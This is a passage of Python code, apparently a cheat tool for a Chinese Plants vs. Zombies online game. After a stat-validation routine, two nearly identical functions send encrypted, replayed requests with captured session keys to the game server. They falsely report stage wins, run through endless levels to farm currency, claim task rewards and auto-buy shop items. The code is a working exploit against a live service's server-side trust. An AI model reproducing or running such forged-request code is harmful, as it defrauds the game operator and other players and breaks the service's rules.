            if num in zw_map:
                d['lev'] += zw_map[num]
    zw_i_set = {item['i'] for item in zw_list}
    pz_dict = {list(plant_dict.keys())[0]: plant_dict for plant_dict in plant_list}
    for dj_dict in dj_list:
        for z in dj_dict['z']:
            z_str = str(z)
            if z_str in zw_i_set:
                plant_info = pz_dict.get(z_str)
                if plant_info:
                    pinzhi = plant_info['pinzhi']
                    if pinzhi == 'baise':
                        dj_dict['lev'] += 1
                    elif pinzhi == 'lvse':
                        dj_dict['lev'] += 2
                    elif pinzhi == 'lanse':
                        dj_dict['lev'] += 3
                    elif pinzhi == 'zise':
                        dj_dict['lev'] += 4
                    elif pinzhi == 'chengse':
                        dj_dict['lev'] += 5
    dj_lev_mapping = {item["i"]: str(item["lev"]) for item in dj_list}
    for fl_item in fl_list:
        fi = str(fl_item["fi"])
        if fi in dj_lev_mapping:
            fl_item["l"] = dj_lev_mapping[fi]
    jz_dict = {"50001": "新人组", "50002": "光芒万丈", "50003": "不动如山", "50004": "真能打","50005": "我要打十个", "50006": "火力全开", "50007": "冰力四射", "50008": "雷霆万钧","50009": "能量武器", "50010": "精英豌豆", "50011": "军火库", "50012": "三分王","50013": "神射手", "50014": "百步穿僵", "50015": "人多力量大", "50016": "踩僵尸的蘑菇","50017": "暗影家族", "50018": "环保卫士", "50019": "文艺青年", "50020": "忍者小队","50021": "大厨组合", "50022": "摧枯拉朽", "50023": "坚固防线", "50024": "控场大师","50025": "魔法大师", "50026": "枝繁叶茂", "50027": "十二生肖", "50028": "繁花似锦","50029": "打飞他们", "50030": "十万伏特", "50031": "动物世界", "50032": "炸个痛快","50033": "小心脚下", "50034": "惊声尖笑", "50035": "运动健将", "50036": "不如跳舞","50037": "头有点晕", "50038": "酸甜苦辣", "50039": "武林对决", "50040": "地爆天星","50041": "光暗交织", "50042": "亿点控制", "50043": "冰与火", "50044": "未来科技","50045": "花开富贵", "50046": "火力压制", "50047": "群卜荟萃", "50048": "狂欢派对","50049": "过载电流", "50050": "来自深渊", "50051": "乘风破浪"}
    for item in fl_list:
        family_id = item.pop('fi', None)
        item['家族'] = jz_dict.get(str(family_id), str(family_id))
        level = item.pop('l', None)
        item['等级'] = level
        c_list = item.get('c', [])
        for entry in c_list:
            if 'm' in entry:
                del entry['m']
            if c_list.index(entry) == 0:
                if 't' in entry: entry['上词条名'] = entry.pop('t')
                if 'n' in entry: entry['上词条数值'] = entry.pop('n')
                if 'bt' in entry: entry['待定上词条'] = entry.pop('bt')
                if 'bn' in entry: entry['待定上词条数值'] = entry.pop('bn')
            else:
                if 't' in entry: entry['下词条名'] = entry.pop('t')
                if 'n' in entry: entry['下词条数值'] = entry.pop('n')
                if 'bt' in entry: entry['待定下词条'] = entry.pop('bt')
                if 'bn' in entry: entry['待定下词条数值'] = entry.pop('bn')
    RULES = {'extra_attack': lambda l: l / 100 + 0.02,'improved_atk_rate': lambda l: l / 200 + 0.01,'improved_sunproduce_rate': lambda l: l / 200 + 0.01,'fast_plant': lambda l: l / 50 + 0.04,'extra_sunmoney_25': lambda l: l / 50 + 0.04,'extra_sunmoney_50': lambda l: l / 100 + 0.02,'extra_hitpoints': lambda l: l / 100 + 0.02,'extra_defend': lambda l: l / 100 + 0.02,'improved_explode_damage': lambda l: l / 100 + 0.02,'improved_lightning_damage': lambda l: l / 100 + 0.02,'improved_flame_damage': lambda l: l / 100 + 0.02,'improved_cold_damage': lambda l: l / 100 + 0.02,'extra_melee_attack': lambda l: l / 100 + 0.02,'plant_sun_refund': lambda l: l / 100 + 0.02,'regeneration': lambda l: l / 200 + 0.01,'invincible': lambda l: l / 200 + 0.01,'lower_cost': lambda l: l + 2}
    errors = []
    for family in fl_list:
        try:
            level = float(family['等级'])
        except (KeyError, ValueError):
            continue
        for entry in family.get('c', []):
            if '上词条名' in entry and '上词条数值' in entry:
                term_val = entry['上词条名']
                num_key = '上词条数值'
                try:
                    current_val = float(entry[num_key])
                except (ValueError, TypeError):
                    continue
                if term_val in RULES:
                    max_allowed = RULES[term_val](level)
                    if current_val > max_allowed:
                        errors.append({'家族': family['家族'],'等级': level,'检查项': f"上词条名[{term_val}]对应的数值",'当前值': current_val,'允许最大值': max_allowed,'原因': f"{num_key}超过规则限制：当前值{current_val:.6f}，允许最大值{max_allowed:.6f}"})
            if '下词条名' in entry and '下词条数值' in entry:
                term_val = entry['下词条名']
                num_key = '下词条数值'
                try:
                    current_val = float(entry[num_key])
                except (ValueError, TypeError):
                    continue
                if term_val in RULES:
                    max_allowed = RULES[term_val](level)
                    if current_val > max_allowed:
                        errors.append({'家族': family['家族'],'等级': level,'检查项': f"下词条名[{term_val}]对应的数值",'当前值': current_val,'允许最大值': max_allowed,'原因': f"{num_key}超过规则限制：当前值{current_val:.6f}，允许最大值{max_allowed:.6f}"})
            if '待定上词条' in entry and '待定上词条数值' in entry:
                term_val = entry['待定上词条']
                num_key = '待定上词条数值'
                try:
                    current_val = float(entry[num_key])
                except (ValueError, TypeError):
                    continue
                if term_val in RULES:
                    max_allowed = RULES[term_val](level)
                    if current_val > max_allowed:
                        errors.append({'家族': family['家族'],'等级': level,'检查项': f"待定上词条[{term_val}]对应的数值",'当前值': current_val,'允许最大值': max_allowed,'原因': f"{num_key}超过规则限制：当前值{current_val:.6f}，允许最大值{max_allowed:.6f}"})
            if '待定下词条' in entry and '待定下词条数值' in entry:
                term_val = entry['待定下词条']
                num_key = '待定下词条数值'
                try:
                    current_val = float(entry[num_key])
                except (ValueError, TypeError):
                    continue
                if term_val in RULES:
                    max_allowed = RULES[term_val](level)
                    if current_val > max_allowed:
                        errors.append({'家族': family['家族'],'等级': level,'检查项': f"待定下词条[{term_val}]对应的数值",'当前值': current_val,'允许最大值': max_allowed,'原因': f"{num_key}超过规则限制：当前值{current_val:.6f}，允许最大值{max_allowed:.6f}"})
    if errors:
        translation_dict = {"extra_attack": "攻击力增加","improved_atk_rate": "攻击速度增加","improved_sunproduce_rate": "生产速度增加","fast_plant": "种植冷却缩短","extra_sunmoney_25": "额外产出25阳光","extra_sunmoney_50": "额外产出50阳光","extra_hitpoints": "生命值增加","extra_defend": "防御力增加","regeneration": "每5秒恢复生命","improved_explode_damage": "爆炸伤害增加","improved_lightning_damage": "闪电伤害增加","improved_flame_damage": "火焰伤害增加","improved_cold_damage": "冰冻伤害增加","extra_melee_attack": "近战伤害增加","lower_cost": "阳光消耗降低","invincible": "无敌3秒概率","ghost": "灵魂状态概率","plant_sun_refund": "返还阳光概率"}
        for item in errors:
            original_text = item['检查项']
            def replacer(match):
                key_inside = match.group(1)
                chinese_name = translation_dict.get(key_inside, key_inside)
                return f"[{chinese_name}]"
            new_text = re.sub(r'\[(.*?)\]', replacer, original_text)
            item['检查项'] = new_text
        print("=" * 50)
        print("以下条目不符合数值规则：")
        print("=" * 50)
        for idx, error in enumerate(errors, 1):
            print(f"错误{idx}:")
            print(f"  家族：{error['家族']}")
            print(f"  等级：{error['等级']:.1f}" if isinstance(error['等级'], float) else f"  等级：{error['等级']}")
            print(f"  检查项：{error['检查项']}")
            print(f"  当前值：{error['当前值']:.6f}")
            print(f"  允许最大值：{error['允许最大值']:.6f}")
            print("-" * 100)
        return False
    else:
        print(f"\n所有家族均符合数值规则\n")
        return True
def pingxingyuzhou_2():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10849, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_dict = json.loads(decrypted_json['e']['d'][0]['data'])
        excluded_names = {"uncharted_mausoleum_2"}
        remaining_name = next((world["name"] for world in data_dict["world"] if world["name"] in excluded_names),None)
        target_world = next((world for world in data_dict['world'] if world['name'] in excluded_names),None)
        generalInfo = target_world['generalInfo']
        bossInfo = target_world['bossInfo']
        indices = [idx for idx, item in enumerate(generalInfo) if int(item.get('ss', 0)) != 2]
        bossindices = [idx for idx, item in enumerate(bossInfo) if int(item.get('ss', 0)) != 2]
        for l_value in indices:
            data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060,0],"sk":sk,"t":"0","ui":ui,"w":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            data = {"req":"V411","e":{"level":l_value,"pi":pi,"record":{"d":{"crc":"","cs":0,"cpl":[],"pnl":[]}},"sk":sk,"tgt":"","type":"0","ui":ui,"win":"1","world":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("简单模式过关成功")
            else:
                print("简单模式过关失败")
        for l_value in bossindices:
            data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060],"sk":sk,"t":"1","ui":ui,"w":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            data = {"req":"V411","e":{"level":l_value,"pi":pi,"record":{"d":{"crc":"","cs":0,"cpl":[],"pnl":[{"i":111064,"q":4},{"i":1013,"q":1},{"i":111029,"q":1}]}},"sk":sk,"tgt":"","type":"1","ui":ui,"win":"1","world":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("困难模式过关成功")
            elif response_data.get("r") == 75511:
                print("困难模式未开启")
                break
            else:
                print("困难模式过关失败")
                break
        endlessTask = target_world['mausoleumInfo']['endlessTask']
        wl = target_world['mausoleumInfo']['endlessData']['l']
        max_limit = max(item['limit'] for item in endlessTask)
        all_s_are_two = all(item['s'] == 2 for item in endlessTask)
        if all_s_are_two:
            pass
        else:
            ids_without_s2 = [item['id'] for item in endlessTask if item['s'] != 2]
            for i in range(int(max_limit) - int(wl) + 1):
                data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060,0],"sk":sk,"t":"0","ui":ui,"w":remaining_name},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                data = {"req":"V1263","e":{"pi":pi,"r":{"pl":[{"Row":0,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":1,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":2,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":6,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}}],"mr":{"l":1,"hp":1.000000,"attr":1.000000},"l":int(wl)+1+i,"sum":1450,"pf":0,"ml":1},"sk":sk,"ui":ui,"w":remaining_name,"win":"1"},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print(f"无尽{int(wl)+1+i}关，过关成功")
                else:
                    print(f"无尽{int(wl)+1+i}关，过关失败")
            data = {"req":"V1263","e":{"pi":pi,"sk":sk,"ui":ui,"w":remaining_name,"win":"0"},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("无尽模式结算成功")
            else:
                print("无尽模式结算失败")
            for id in ids_without_s2:
                data = {"req":"V1262","e":{"id":id,"pi":pi,"sk":sk,"ui":ui,"w":remaining_name},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("任务领取成功")
                else:
                    print("任务领取失败")
        u_input = input("请设定无尽关数(刷币，回车跳过):").strip()
        try:
            u_input = int(u_input) - int(wl)
            for i in range(u_input):
                data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060,0],"sk":sk,"t":"0","ui":ui,"w":remaining_name},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                data = {"req":"V1263","e":{"pi":pi,"r":{"pl":[{"Row":0,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":1,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":2,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":6,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}}],"mr":{"l":1,"hp":1.000000,"attr":1.000000},"l":int(wl)+1+i,"sum":1450,"pf":0,"ml":1},"sk":sk,"ui":ui,"w":remaining_name,"win":"1"},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("无尽模式过关成功")
                else:
                    print("无尽模式过关失败")
            data = {"req":"V1263","e":{"pi":pi,"sk":sk,"ui":ui,"w":remaining_name,"win":"0"},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("无尽模式结算成功")
            else:
                print("无尽模式结算失败")
        except ValueError:
            pass
    choice = input("输入1商品自动购买，回车跳过):").strip()
    if choice == "1":
        target_t = None
        for item in target_world['shopList']:
            if item['i'] == 3008:
                target_t = item['t']
                break
        for item in target_world['shopList']:
            if item.get('t') == target_t:
                i_val = item['i']
                m_val = int(item['m'])
                f_val = int(item['f'])
                c_val = item['c']
                t_val = item['t']
                for i in range(m_val - f_val):
                    data = {"req":"V392","e":{"ci":c_val,"gi":i_val,"mi":m_val,"pi":pi,"q":"1","si":"23","sk":sk,"ui":ui,"w":remaining_name},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("购买成功")
                    elif response_data.get("r") == 46361:
                        print("兑换币不足")
                        break
                    else:
                        print("购买失败")
                        break
    else:
        pass
def pingxingyuzhou():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10849, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_dict = json.loads(decrypted_json['e']['d'][0]['data'])
        excluded_names = {"uncharted_mausoleum"}
        remaining_name = next((world["name"] for world in data_dict["world"] if world["name"] in excluded_names),None)
        target_world = next((world for world in data_dict['world'] if world['name'] in excluded_names),None)
        generalInfo = target_world['generalInfo']
        bossInfo = target_world['bossInfo']
        indices = [idx for idx, item in enumerate(generalInfo) if int(item.get('ss', 0)) != 2]
        bossindices = [idx for idx, item in enumerate(bossInfo) if int(item.get('ss', 0)) != 2]
        for l_value in indices:
            data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060,0],"sk":sk,"t":"0","ui":ui,"w":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            data = {"req":"V411","e":{"level":l_value,"pi":pi,"record":{"d":{"crc":"","cs":0,"cpl":[],"pnl":[]}},"sk":sk,"tgt":"","type":"0","ui":ui,"win":"1","world":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("简单模式过关成功")
            else:
                print("简单模式过关失败")
        for l_value in bossindices:
            data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060],"sk":sk,"t":"1","ui":ui,"w":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            data = {"req":"V411","e":{"level":l_value,"pi":pi,"record":{"d":{"crc":"","cs":0,"cpl":[],"pnl":[{"i":111064,"q":4},{"i":1013,"q":1},{"i":111029,"q":1}]}},"sk":sk,"tgt":"","type":"1","ui":ui,"win":"1","world":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("困难模式过关成功")
            else:
                print("困难模式过关失败")
        endlessTask = target_world['mausoleumInfo']['endlessTask']
        wl = target_world['mausoleumInfo']['endlessData']['l']
        max_limit = max(item['limit'] for item in endlessTask)
        all_s_are_two = all(item['s'] == 2 for item in endlessTask)
        if all_s_are_two:
            pass
        else:
            ids_without_s2 = [item['id'] for item in endlessTask if item['s'] != 2]
            for i in range(int(max_limit) - int(wl) + 1):
                data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060,0],"sk":sk,"t":"0","ui":ui,"w":remaining_name},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                data = {"req":"V1263","e":{"pi":pi,"r":{"pl":[{"Row":0,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":1,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":2,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":6,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}}],"mr":{"l":1,"hp":1.000000,"attr":1.000000},"l":int(wl)+1+i,"sum":1450,"pf":0,"ml":1},"sk":sk,"ui":ui,"w":remaining_name,"win":"1"},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print(f"无尽{int(wl)+1+i}关，过关成功")
                else:
                    print(f"无尽{int(wl)+1+i}关，过关失败")
            data = {"req":"V1263","e":{"pi":pi,"sk":sk,"ui":ui,"w":remaining_name,"win":"0"},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("无尽模式结算成功")
            else:
                print("无尽模式结算失败")
            for id in ids_without_s2:
                data = {"req":"V1262","e":{"id":id,"pi":pi,"sk":sk,"ui":ui,"w":remaining_name},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("任务领取成功")
                else:
                    print("任务领取失败")
        u_input = input("请设定无尽关数(刷币，回车跳过):").strip()
        try:
            u_input = int(u_input) - int(wl)
            for i in range(u_input):
                data = {"req":"V1260","e":{"pi":pi,"ps":[1052,200166,111064,111064,111029,1013,200060,0],"sk":sk,"t":"0","ui":ui,"w":remaining_name},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                data = {"req":"V1263","e":{"pi":pi,"r":{"pl":[{"Row":0,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":0,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":1,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":2,"Level":1,"PlantId":111029,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":2,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":1,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":3,"Column":4,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":4,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":0,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":5,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200060,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":2,"Column":6,"Level":1,"PlantId":200166,"plantpro":{"SkillType1":0,"SkillType2":0}},{"Row":4,"Column":6,"Level":1,"PlantId":1052,"plantpro":{"SkillType1":0,"SkillType2":0}}],"mr":{"l":1,"hp":1.000000,"attr":1.000000},"l":int(wl)+1+i,"sum":1450,"pf":0,"ml":1},"sk":sk,"ui":ui,"w":remaining_name,"win":"1"},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.2)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("无尽模式过关成功")
                else:
                    print("无尽模式过关失败")
            data = {"req":"V1263","e":{"pi":pi,"sk":sk,"ui":ui,"w":remaining_name,"win":"0"},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("无尽模式结算成功")
            else:
                print("无尽模式结算失败")
        except ValueError:
            pass
    choice = input("输入1商品自动购买，回车跳过):").strip()
    if choice == "1":
        target_t = None
        for item in target_world['shopList']:
            if item['i'] == 3008:
                target_t = item['t']
                break
        for item in target_world['shopList']:
            if item.get('t') == target_t:
                i_val = item['i']
                m_val = int(item['m'])
                f_val = int(item['f'])
                c_val = item['c']
                t_val = item['t']
                for i in range(m_val - f_val):
                    data = {"req":"V392","e":{"ci":c_val,"gi":i_val,"mi":m_val,"pi":pi,"q":"1","si":"23","sk":sk,"ui":ui,"w":remaining_name},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("购买成功")
                    elif response_data.get("r") == 46361:
                        print("兑换币不足")
                        break
                    else:
                        print("购买失败")
